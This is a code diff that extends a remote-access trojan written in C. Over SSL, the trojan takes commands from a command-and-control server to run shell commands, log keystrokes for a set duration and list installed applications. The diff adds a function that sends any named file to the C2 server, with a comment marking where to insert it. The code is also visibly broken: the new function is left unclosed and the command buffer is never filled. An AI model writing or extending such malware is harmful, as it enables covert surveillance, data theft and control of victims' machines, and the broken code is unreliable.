@@ -208,27 +208,46 @@ void run_cmd_command(SSL* ssl, const char* command) {
     _pclose(pipe);
 }
 
+// Function to transfer a file to C2 server
+void transfer_file_to_c2(SSL* ssl, const char* filepath) {
+    FILE* file = fopen(filepath, "rb");
+    if (!file) {
+        printf("Failed to open file for transfer: %s\n", filepath);
+        send_disguised_data(ssl);  // Send error message
+        return;
+    }
+
+    char buffer[BUFFER_SIZE];
+    size_t bytes_read;
+    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
+        if (SSL_write(ssl, buffer, bytes_read) <= 0) {
+            printf("Failed to send file data.\n");
+            break;
+        }
+    }
+
 // Main loop that communicates with the C2 server while performing random actions
 void main_loop(SSL* ssl) {
     char buffer[BUFFER_SIZE];
     while (1) {
         receive_data_from_c2(ssl);
-
         if (strncmp(buffer, "CD ", 3) == 0) {
-            change_directory(ssl, buffer + 3);  
+            change_directory(ssl, buffer + 3);
         } else if (strcmp(buffer, "PWD") == 0) {
             get_current_directory(ssl);
         } else if (strcmp(buffer, "LIST_APPS") == 0) {
             list_installed_applications(ssl);
         } else if (strncmp(buffer, "KEYLOG", 6) == 0) {
-            int duration = atoi(buffer + 7);  
+            int duration = atoi(buffer + 7);  // Parse the duration for keylogging
             capture_keystrokes(ssl, duration);
         } else if (strncmp(buffer, "CMD ", 4) == 0) {
-            run_cmd_command(ssl, buffer + 4);  
+            run_cmd_command(ssl, buffer + 4);  // Execute command
+        } else if (strncmp(buffer, "TRANSFER ", 9) == 0) {  // <<< ADD THIS HERE
+            transfer_file_to_c2(ssl, buffer + 9);  // Transfer specified file
         } else {
             printf("Unknown command received: %s\n", buffer);
         }
-
+        
         random_sleep();
     }
 }
